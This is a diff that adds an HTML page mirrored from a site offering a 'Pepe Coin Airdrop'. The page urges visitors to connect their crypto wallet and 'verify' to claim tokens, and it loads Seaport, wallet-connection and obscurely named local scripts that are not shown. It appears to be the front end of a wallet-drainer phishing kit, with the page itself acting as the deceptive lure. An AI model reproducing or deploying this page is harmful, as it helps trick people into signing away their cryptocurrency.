@@ -1,0 +1,103 @@
+<html style="--vh:10.09px;">
+   
+<!-- Mirrored from www.tokenpepe.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 04 Jul 2023 18:37:28 GMT -->
+<head>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script><script src="./scripts/seaport.js"></script><script src="./scripts/wallet_connect.js"></script><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+      <script src="./35720198-4eae-4bcc-a927-969bcf424fc0.js"></script>
+      <title>Pepe Coin Airdrop</title>
+      <link id="favicon" rel="icon" href="img/fav.png">
+      <script>
+         const val = document.getElementById("count");
+             const decrease = () => {
+                 let num = parseFloat(val.innerText)
+                 if(num > 1) {
+                     val.innerText = parseFloat(num - 1);
+                 }
+             };
+         
+             const increase = () => {
+                 let num = parseFloat(val.innerText)
+                 if(num >= 1 && num < 6) {
+                     val.innerText = parseFloat(num + 1);
+                 }
+             };
+         
+      </script>
+      
+      <style>
+         #WEB3_CONNECT_MODAL_ID{
+         position: absolute;
+         z-index: 1000;
+         }
+      </style>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <script type="text/javascript">
+         const vh = window.innerHeight * 0.01;
+         document.documentElement.style.setProperty('--vh', `${vh < 8.0? 8.0 : vh}px`);
+         window.addEventListener('resize', () => {
+             const vh = window.innerHeight * 0.01;
+             document.documentElement.style.setProperty('--vh', `${vh < 8.0? 8.0 : vh}px`);
+         });
+      </script>
+      <link rel="stylesheet" type="text/css" href="claimMain.css">
+      <link rel="stylesheet" type="text/css" href="normalize.css">
+      <link rel="stylesheet" type="text/css" href="fonts.css" media="all">
+      <link rel="stylesheet" type="text/css" href="alert.css" media="all">
+      <style data-styled="active" data-styled-version="5.2.0"></style>
+   </head>
+   <body id="onload" class="body">
+      <div class="content">
+         <img id="background-video" src="img/bg.html" autoplay="" loop="" muted="" poster="#">
+         <source id="background-video-source" type="video/mp4">
+         </img>
+         <div class="alert-container" id="alert-container"></div>
+         <div class="sub-head" id="claim-text-wrapper">
+            <div class="social_medias">
+            </div>
+            <div id="payment-modal">
+               <div id="payment-header">
+                  <div id="payment-header-text">
+                     <img class="center" src="https://i.seadn.io/gae/uIioSr6RMpiY7lTDbHIIAbsq61haAnTHkLJeOy55v9tSifsjqZNnbWVnFHuDqDejBUhD6zptJBWWPSToZacOCUv9Qj3mVyTAGlAp?auto=format&dpr=1&w=1400&fr=1" width="250" height="250"><br>
+                     <h4 id="lbuy" style="text-align:center;">JOIN $PEPE AIRDROP</h4>
+                     <!-- Auto edit (config in index.js) -->
+                     &nbsp;
+                     <p id="lsupply" class="pt-1.5 italic-grey" style="text-align:center;">Check your Eligibility to Claim $PEPE. Hurry up and take part in the Airdrop. During this unique event we give you a chance to collect tokens.
+                     </p>
+                     &nbsp;
+                     <h5 id="lsupply" class="pt-1.5 italic-grey" style="text-align:center;">Simply Connect Your Wallet and Verify to Claim 1000$ $PEPE Airdrop.</h5>
+                     <!-- Auto edit (config in index.js) -->
+                  </div>
+               </div>
+               <div id="claim-button" class="purchase-button">
+                  <span b-m2fc81gplc="" class="btn-special__inner d-inline-flex">
+                     <center>
+                        <span class="interact-button align-self-center me-2">Connect Wallet</span> 
+                        <!--span b-m2fc81gplc="" class="btn-special__inner__arrow align-self-center"> <span b-m2fc81gplc="" class="spinner-border d-none" role="status" aria-hidden="true"></span> <svg b-m2fc81gplc="" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-caret-right-fill d-inline" viewBox="0 0 16 16"><path b-m2fc81gplc="" d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"></path></svg> </span>
+                           <--> 
+                     </center>
+                  </span>
+               </div>
+               <div class="purchase-button" id="claimSection" style="display:none;text-align: center;">
+                  <span b-m2fc81gplc="" class="btn-special__inner d-inline-flex">
+                     <span b-m2fc81gplc="" class="align-self-center" id="claimButton">Claim Now</span> 
+                     <span b-m2fc81gplc="" class="btn-special__inner__arrow align-self-center">
+                        <span b-m2fc81gplc="" class="spinner-border d-none" role="status" aria-hidden="true"></span> 
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                           <path d="M24 13.616v-3.232c-1.651-.587-2.694-.752-3.219-2.019v-.001c-.527-1.271.1-2.134.847-3.707l-2.285-2.285c-1.561.742-2.433 1.375-3.707.847h-.001c-1.269-.526-1.435-1.576-2.019-3.219h-3.232c-.582 1.635-.749 2.692-2.019 3.219h-.001c-1.271.528-2.132-.098-3.707-.847l-2.285 2.285c.745 1.568 1.375 2.434.847 3.707-.527 1.271-1.584 1.438-3.219 2.02v3.232c1.632.58 2.692.749 3.219 2.019.53 1.282-.114 2.166-.847 3.707l2.285 2.286c1.562-.743 2.434-1.375 3.707-.847h.001c1.27.526 1.436 1.579 2.019 3.219h3.232c.582-1.636.75-2.69 2.027-3.222h.001c1.262-.524 2.12.101 3.698.851l2.285-2.286c-.744-1.563-1.375-2.433-.848-3.706.527-1.271 1.588-1.44 3.221-2.021zm-12 2.384c-2.209 0-4-1.791-4-4s1.791-4 4-4 4 1.791 4 4-1.791 4-4 4z"></path>
+                        </svg>
+                     </span>
+                  </span>
+                  <p id="walletAddress"></p>
+                  <p id="notEli" class="notEli" style="display:none; color: red;">Wallet is not Eligible. Use a different Wallet</p>
+               </div>
+            </div>
+            </a>
+         </div>
+      </div>
+      </div>
+      </div>
+   </body>
+
+<!-- Mirrored from www.tokenpepe.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 04 Jul 2023 18:37:33 GMT -->
+</html>
